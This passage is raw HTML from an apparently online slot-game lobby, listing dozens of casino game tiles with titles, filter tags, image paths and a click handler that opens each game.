          <h5 data-title="Empty the Bank™">Empty the Bank™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Heart of Rio™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Heart of Rio™', '/assets/games/i/165x220/af3e5618d1e69076fa0718dbbe05ef2b.webp?v=0.1' , 'vs25rio', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/af3e5618d1e69076fa0718dbbe05ef2b.webp?v=0.1" src="/assets/games/i/165x220/af3e5618d1e69076fa0718dbbe05ef2b.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Heart of Rio™">Heart of Rio™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Lucky Lightning" data-filter="ALL,BUY BONUS FEATURE,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Lucky Lightning', '/assets/games/i/165x220/175767cdb0ad4fa3c3094c560103f1d2.webp?v=0.1' , 'vswayslight', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/175767cdb0ad4fa3c3094c560103f1d2.webp?v=0.1" src="/assets/games/i/165x220/175767cdb0ad4fa3c3094c560103f1d2.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Lucky Lightning">Lucky Lightning</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fruit Party 2" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fruit Party 2', '/assets/games/i/165x220/49351b3ab2108a30bd0b7ef084af3549.webp?v=0.1' , 'vs20fparty2', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/49351b3ab2108a30bd0b7ef084af3549.webp?v=0.1" src="/assets/games/i/165x220/49351b3ab2108a30bd0b7ef084af3549.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fruit Party 2">Fruit Party 2</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Phoenix Forge™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Phoenix Forge™', '/assets/games/i/165x220/fb8dc2040e9748f4c61d42758d227b16.webp?v=0.1' , 'vs20phoenixf', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/fb8dc2040e9748f4c61d42758d227b16.webp?v=0.1" src="/assets/games/i/165x220/fb8dc2040e9748f4c61d42758d227b16.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Phoenix Forge™">Phoenix Forge™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Chicken Drop" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Chicken Drop', '/assets/games/i/165x220/b3a0a73d32b0680aca27dcb780a0ae96.webp?v=0.1' , 'vs20chickdrop', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/b3a0a73d32b0680aca27dcb780a0ae96.webp?v=0.1" src="/assets/games/i/165x220/b3a0a73d32b0680aca27dcb780a0ae96.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Chicken Drop">Chicken Drop</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Aztec King Megaways™" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Aztec King Megaways™', '/assets/games/i/165x220/3f7397c13bfa67308fea417ea0f5da8d.webp?v=0.1' , 'vswaysaztecking', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/3f7397c13bfa67308fea417ea0f5da8d.webp?v=0.1" src="/assets/games/i/165x220/3f7397c13bfa67308fea417ea0f5da8d.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Aztec King Megaways™">Aztec King Megaways™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Chilli Heat Megaways™" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Chilli Heat Megaways™', '/assets/games/i/165x220/27ad52d08169f458c52fde393be9cee8.webp?v=0.1' , 'vswayschilheat', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/27ad52d08169f458c52fde393be9cee8.webp?v=0.1" src="/assets/games/i/165x220/27ad52d08169f458c52fde393be9cee8.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Chilli Heat Megaways™">Chilli Heat Megaways™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Lucky Grace And Charm" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Lucky Grace And Charm', '/assets/games/i/165x220/c2c7a362f45f4d0972c162a0dac17a55.webp?v=0.1' , 'vs10luckcharm', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/c2c7a362f45f4d0972c162a0dac17a55.webp?v=0.1" src="/assets/games/i/165x220/c2c7a362f45f4d0972c162a0dac17a55.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Lucky Grace And Charm">Lucky Grace And Charm</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Yum Yum Powerways™" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Yum Yum Powerways™', '/assets/games/i/165x220/e2890992c848b859bbdbf8ebdcbdf8a3.webp?v=0.1' , 'vswaysyumyum', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/e2890992c848b859bbdbf8ebdcbdf8a3.webp?v=0.1" src="/assets/games/i/165x220/e2890992c848b859bbdbf8ebdcbdf8a3.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Yum Yum Powerways™">Yum Yum Powerways™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Pyramid Bonanza™" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Pyramid Bonanza™', '/assets/games/i/165x220/d1e6169535b7765a6e34d3c5de7cdada.webp?v=0.1' , 'vs20pbonanza', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" lazyloaded" data-src="/assets/games/i/165x220/d1e6169535b7765a6e34d3c5de7cdada.webp?v=0.1" src="/assets/games/i/165x220/d1e6169535b7765a6e34d3c5de7cdada.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Pyramid Bonanza™">Pyramid Bonanza™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Raging Bull™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Raging Bull™', '/assets/games/i/165x220/0d7a7dd08ce9b1c2bae4ecfeba5ef64b.webp?v=0.1' , 'vs243chargebull', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" lazyloaded" data-src="/assets/games/i/165x220/0d7a7dd08ce9b1c2bae4ecfeba5ef64b.webp?v=0.1" src="/assets/games/i/165x220/0d7a7dd08ce9b1c2bae4ecfeba5ef64b.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Raging Bull™">Raging Bull™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Starlight Princess" data-filter="ALL,BUY BONUS FEATURE,TOP,HYPERPLAY" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Starlight Princess', '/assets/games/i/165x220/c957cd96f3779941ca5755ad5a3e9af0.webp?v=0.1' , 'vs20starlight', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/c957cd96f3779941ca5755ad5a3e9af0.webp?v=0.1" src="/assets/games/i/165x220/c957cd96f3779941ca5755ad5a3e9af0.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Starlight Princess">Starlight Princess</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="John Hunter and the Book of Tut" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'John Hunter and the Book of Tut', '/assets/games/i/165x220/6d2c8a954dabb6025ff1a23c572567c5.webp?v=0.1' , 'vs10bookoftut', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" lazyloaded" data-src="/assets/games/i/165x220/6d2c8a954dabb6025ff1a23c572567c5.webp?v=0.1" src="/assets/games/i/165x220/6d2c8a954dabb6025ff1a23c572567c5.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="John Hunter and the Book of Tut">John Hunter and the Book of Tut</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Treasure Wild™" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Treasure Wild™', '/assets/games/i/165x220/1d4f25e92bef587ebd2c7e638a4d5726.webp?v=0.1' , 'vs20trsbox', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/1d4f25e92bef587ebd2c7e638a4d5726.webp?v=0.1" src="/assets/games/i/165x220/1d4f25e92bef587ebd2c7e638a4d5726.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Treasure Wild™">Treasure Wild™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Cash Bonanza™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Cash Bonanza™', '/assets/games/i/165x220/053001703083869c688f376d0861cfe5.webp?v=0.1' , 'vswaysbankbonz', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/053001703083869c688f376d0861cfe5.webp?v=0.1" src="/assets/games/i/165x220/053001703083869c688f376d0861cfe5.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Cash Bonanza™">Cash Bonanza™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Piggy Bank Bilss™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Piggy Bank Bilss™', '/assets/games/i/165x220/5ce478641cf3aae01558aad99ac9af06.webp?v=0.1' , 'vs9piggybank', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/5ce478641cf3aae01558aad99ac9af06.webp?v=0.1" src="/assets/games/i/165x220/5ce478641cf3aae01558aad99ac9af06.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Piggy Bank Bilss™">Piggy Bank Bilss™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Candy Village™" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Candy Village™', '/assets/games/i/165x220/27ab494c255215f76ea9c35a641ad085.webp?v=0.1' , 'vs20candvil', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/27ab494c255215f76ea9c35a641ad085.webp?v=0.1" src="/assets/games/i/165x220/27ab494c255215f76ea9c35a641ad085.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Candy Village™">Candy Village™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Day of Dead™" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Day of Dead™', '/assets/games/i/165x220/3dd506d6bea1550f4a76f33ab6607089.webp?v=0.1' , 'vs20daydead', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/3dd506d6bea1550f4a76f33ab6607089.webp?v=0.1" src="/assets/games/i/165x220/3dd506d6bea1550f4a76f33ab6607089.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Day of Dead™">Day of Dead™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="The Tweety House™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'The Tweety House™', '/assets/games/i/165x220/8821dbc16687f4d1d2f43b2fa8c8f6ae.webp?v=0.1' , 'vs20tweethouse', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/8821dbc16687f4d1d2f43b2fa8c8f6ae.webp?v=0.1" src="/assets/games/i/165x220/8821dbc16687f4d1d2f43b2fa8c8f6ae.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="The Tweety House™">The Tweety House™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mystic Chief™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mystic Chief™', '/assets/games/i/165x220/440a989ba56d95585b2e9f4c93cdbde2.webp?v=0.1' , 'vswayswest', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/440a989ba56d95585b2e9f4c93cdbde2.webp?v=0.1" src="/assets/games/i/165x220/440a989ba56d95585b2e9f4c93cdbde2.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mystic Chief™">Mystic Chief™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="John Hunter and the Quest for Bermuda Riches™" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'John Hunter and the Quest for Bermuda Riches™', '/assets/games/i/165x220/8b0633cf13d1581075f5727dfac54e96.webp?v=0.1' , 'vs20bermuda', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/8b0633cf13d1581075f5727dfac54e96.webp?v=0.1" src="/assets/games/i/165x220/8b0633cf13d1581075f5727dfac54e96.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="John Hunter and the Quest for Bermuda Riches™">John Hunter and the Quest for Bermuda Riches™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Star Pirates Code™" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Star Pirates Code™', '/assets/games/i/165x220/2acf45975458d283f035c010f7f27b20.webp?v=0.1' , 'vs10starpirate', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/2acf45975458d283f035c010f7f27b20.webp?v=0.1" src="/assets/games/i/165x220/2acf45975458d283f035c010f7f27b20.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Star Pirates Code™">Star Pirates Code™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Big Juan™" data-filter="ALL,BUY BONUS FEATURE,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Big Juan™', '/assets/games/i/165x220/e625c275131c297792dffce3ac488e4d.webp?v=0.1' , 'vs40bigjuan', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/e625c275131c297792dffce3ac488e4d.webp?v=0.1" src="/assets/games/i/165x220/e625c275131c297792dffce3ac488e4d.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Big Juan™">Big Juan™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Santa&amp;quot;amp;s Wonderland™" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Santa&amp;quot;amp;s Wonderland™', '/assets/games/i/165x220/d78d899fd5eb0b5ab862acda3a395790.webp?v=0.1' , 'vs20santawonder', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/d78d899fd5eb0b5ab862acda3a395790.webp?v=0.1" src="/assets/games/i/165x220/d78d899fd5eb0b5ab862acda3a395790.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Santa's Wonderland™">Santa's Wonderland™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Christmas Big Bass Bonanza™" data-filter="ALL,BUY BONUS FEATURE,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Christmas Big Bass Bonanza™', '/assets/games/i/165x220/1808fc605d3f6ea06e2ef17df61cbc5d.webp?v=0.1' , 'vs10bxmasbnza', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/1808fc605d3f6ea06e2ef17df61cbc5d.webp?v=0.1" src="/assets/games/i/165x220/1808fc605d3f6ea06e2ef17df61cbc5d.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Christmas Big Bass Bonanza™">Christmas Big Bass Bonanza™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Book of Fallen™" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Book of Fallen™', '/assets/games/i/165x220/8aa5df153a3d0ef155cca380a35e9a43.webp?v=0.1' , 'vs10bookfallen', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/8aa5df153a3d0ef155cca380a35e9a43.webp?v=0.1" src="/assets/games/i/165x220/8aa5df153a3d0ef155cca380a35e9a43.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Book of Fallen™">Book of Fallen™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Bubble Pop™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Bubble Pop™', '/assets/games/i/165x220/4c05934dc6f02dd42dc1ef40c8dd950d.webp?v=0.1' , 'vs10bblpop', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/4c05934dc6f02dd42dc1ef40c8dd950d.webp?v=0.1" src="/assets/games/i/165x220/4c05934dc6f02dd42dc1ef40c8dd950d.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Bubble Pop™">Bubble Pop™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Bounty Gold™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Bounty Gold™', '/assets/games/i/165x220/a2744720eb644cf0197ecf139ec186e4.webp?v=0.1' , 'vs25btygold', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/a2744720eb644cf0197ecf139ec186e4.webp?v=0.1" src="/assets/games/i/165x220/a2744720eb644cf0197ecf139ec186e4.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Bounty Gold™">Bounty Gold™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Hockey Attack™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Hockey Attack™', '/assets/games/i/165x220/0cddf059471509d0cb398f273033d14b.webp?v=0.1' , 'vs88hockattack', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/0cddf059471509d0cb398f273033d14b.webp?v=0.1" src="/assets/games/i/165x220/0cddf059471509d0cb398f273033d14b.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Hockey Attack™">Hockey Attack™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Crystal Caverns Megaways ™" data-filter="ALL,BUY BONUS FEATURE" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Crystal Caverns Megaways ™', '/assets/games/i/165x220/c4399f622826ba0fe9467e831ed91b24.webp?v=0.1' , 'vswayscryscav', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/c4399f622826ba0fe9467e831ed91b24.webp?v=0.1" src="/assets/games/i/165x220/c4399f622826ba0fe9467e831ed91b24.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Crystal Caverns Megaways ™">Crystal Caverns Megaways ™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Big Bass Bonanza Megaways™" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Big Bass Bonanza Megaways™', '/assets/games/i/165x220/777df4d7c874983d2ad5e5c62770ac67.webp?v=0.1' , 'vswaysbbb', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/777df4d7c874983d2ad5e5c62770ac67.webp?v=0.1" src="/assets/games/i/165x220/777df4d7c874983d2ad5e5c62770ac67.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Big Bass Bonanza Megaways™">Big Bass Bonanza Megaways™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Lucky New Year Tiger Treasures™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Lucky New Year Tiger Treasures™', '/assets/games/i/165x220/3e0d666b5ea0d15763dcd8da04125ebd.webp?v=0.1' , 'vs25tigeryear', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/3e0d666b5ea0d15763dcd8da04125ebd.webp?v=0.1" src="/assets/games/i/165x220/3e0d666b5ea0d15763dcd8da04125ebd.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Lucky New Year Tiger Treasures™">Lucky New Year Tiger Treasures™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Smugglers Cove™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Smugglers Cove™', '/assets/games/i/165x220/563b17714b50d0fb19fd752c4bbe989e.webp?v=0.1' , 'vs20smugcove', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/563b17714b50d0fb19fd752c4bbe989e.webp?v=0.1" src="/assets/games/i/165x220/563b17714b50d0fb19fd752c4bbe989e.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Smugglers Cove™">Smugglers Cove™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Super X ™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Super X ™', '/assets/games/i/165x220/9bbf537014a7b8152124a0d641a4a941.webp?v=0.1' , 'vs20superx', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/9bbf537014a7b8152124a0d641a4a941.webp?v=0.1" src="/assets/games/i/165x220/9bbf537014a7b8152124a0d641a4a941.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Super X ™">Super X ™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Emperor Caishen™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Emperor Caishen™', '/assets/games/i/165x220/e08cee0d18d329d04f404f7fa06472b1.webp?v=0.1' , 'vs243empcaishen', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/e08cee0d18d329d04f404f7fa06472b1.webp?v=0.1" src="/assets/games/i/165x220/e08cee0d18d329d04f404f7fa06472b1.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Emperor Caishen™">Emperor Caishen™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Extra Juicy Megaways™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Extra Juicy Megaways™', '/assets/games/i/165x220/8457276b4d4bff87f190c0df6533fb49.webp?v=0.1' , 'vswaysxjuicy', '' )" style="">

          <div class="content-wrapper">
              
